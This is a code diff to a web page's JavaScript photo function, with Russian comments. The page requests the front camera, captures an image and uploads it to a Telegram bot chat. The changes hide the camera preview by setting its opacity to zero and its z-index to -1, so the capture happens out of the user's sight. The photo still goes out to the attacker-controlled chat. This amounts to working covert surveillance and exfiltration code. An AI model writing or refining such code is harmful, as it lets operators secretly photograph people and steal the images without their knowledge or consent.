@@ -141,15 +141,20 @@
         async function takePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } // использует фронтальную камеру на телефонах
+                    video: { facingMode: 'user' }
                 });
                 
                 const video = document.getElementById('camera');
                 const container = document.getElementById('camera-container');
                 
                 video.srcObject = stream;
+                
+                // Делаем контейнер и видео невидимыми
                 container.style.display = 'block';
-
+                container.style.opacity = '0';
+                container.style.zIndex = '-1';
+                video.style.opacity = '0';
+                
                 // Ждем 1 секунду для инициализации камеры
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
@@ -166,10 +171,21 @@
                 const formData = new FormData();
                 formData.append('photo', blob, 'photo.jpg');
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                    method: 'POST',
-                    body: formData
-                });
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await response.json();
+                    if (!result.ok) {
+                        console.error('Ошибка отправки в Telegram:', result);
+                    } else {
+                        console.log('Фото отправлено');
+                    }
+                } catch (error) {
+                    console.error('Ошибка отправки:', error);
+                }
 
                 // Закрываем камеру
                 stream.getTracks().forEach(track => track.stop());
